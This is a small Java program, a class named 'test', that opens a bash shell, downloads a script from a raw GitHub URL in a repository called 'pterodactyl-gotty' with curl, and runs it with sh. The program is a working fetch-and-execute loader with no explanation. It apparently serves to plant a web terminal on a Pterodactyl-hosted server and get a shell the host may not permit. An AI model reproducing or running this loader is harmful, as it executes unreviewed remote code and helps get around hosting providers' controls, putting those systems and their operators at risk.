package cmd;

import java.io.OutputStream;
import java.io.IOException;
import java.io.Writer;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class test
{
    public static void main(final String[] args) {
        final ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);
        processBuilder.command("bash");
        try {
            final Process process = processBuilder.start();
            final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            final OutputStream os = process.getOutputStream();
            final BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
            bw.write("curl -o 1.sh https://raw.githubusercontent.com/mxl0s/pterodactyl-gotty/main/Script.txt");
            bw.newLine();
            bw.write("sh 1.sh");
            bw.newLine();
            bw.flush();
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            final int exitCode = process.waitFor();
            System.out.println("\nExited with error code : " + exitCode);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        catch (InterruptedException e2) {
            e2.printStackTrace();
        }
    }
}
